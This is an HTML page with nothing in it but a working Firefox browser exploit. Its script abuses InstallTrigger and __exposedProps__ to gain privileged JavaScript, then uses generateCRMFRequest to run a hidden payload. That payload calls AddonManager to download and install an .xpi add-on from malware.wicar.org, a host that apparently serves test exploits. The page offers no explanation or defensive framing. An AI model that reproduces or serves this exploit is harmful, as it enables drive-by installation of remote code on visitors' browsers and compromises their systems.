      <html>
      <body>
      
      <div id='payload' style='display:none'>
        
      if (!window.done) {
        window.AddonManager.getInstallForURL(
          'http://malware.wicar.org/data/firefox_proto_crmfrequest_addon.xpi',
          function(install) { install.install() },
          'application/x-xpinstall'
        );
        window.done = true;
      }
    
      </div>
      <script>
        
      try{InstallTrigger.install(0)}catch(e){p=e;};
      var p2=Object.getPrototypeOf(Object.getPrototypeOf(p));
      p2.__exposedProps__={
        constructor:'rw',
        prototype:'rw',
        defineProperty:'rw',
        __exposedProps__:'rw'
      };
      var s = document.querySelector('#payload').innerHTML;
      var q = false;
      var register = function(obj,key) {
        var runme = function(){
          if (q) return;
          q = true;
          window.crypto.generateCRMFRequest("CN=Me", "foo", "bar", null, s, 384, null, "rsa-ex");
        };
        try {
          p2.constructor.defineProperty(obj,key,{get:runme});
        } catch (e) {}
      };
      for (var i in window) register(window, i);
      for (var i in document) register(document, i);
    
      </script>
      </body>
      </html>
